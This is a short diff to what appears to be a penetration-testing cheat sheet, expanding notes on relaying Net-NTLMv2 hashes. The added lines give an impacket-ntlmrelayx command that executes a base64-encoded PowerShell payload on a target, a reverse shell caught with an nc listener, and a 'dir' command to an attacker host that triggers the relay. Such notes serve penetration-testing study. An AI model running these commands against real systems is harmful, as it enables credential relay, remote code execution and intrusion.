@@ -3533,7 +3533,9 @@ Crack the Net-NTLMv2 hash
 Relaying Net-NTLMv2
 1. Instead of printing a retrieved Net-NTLMv2 hash, we'll forward it to `<IP>` that it's the target machine
 2. `sudo impacket-ntlmrelayx --no-http-server -smb2support -t <IP> -c "powershell -enc <BASE64>"`
-3. Now, if a user tries to connect to our machine, it will forward the request to `<IP>`
+   - use it to execute a reverse shell on your machine on port `<PORT>` and run a listener `nc -nvlp <PORT>`
+   - see how to encode one-liner in base64 [here](#microsoft-office)
+3. Now, if a user tries to connect to our machine with `dir \\<ATTACKER-IP>\test`, it will forward the request to `<IP>` and execute the command specified in the flag `-c`
 
 
 #### Pass-the-Hash
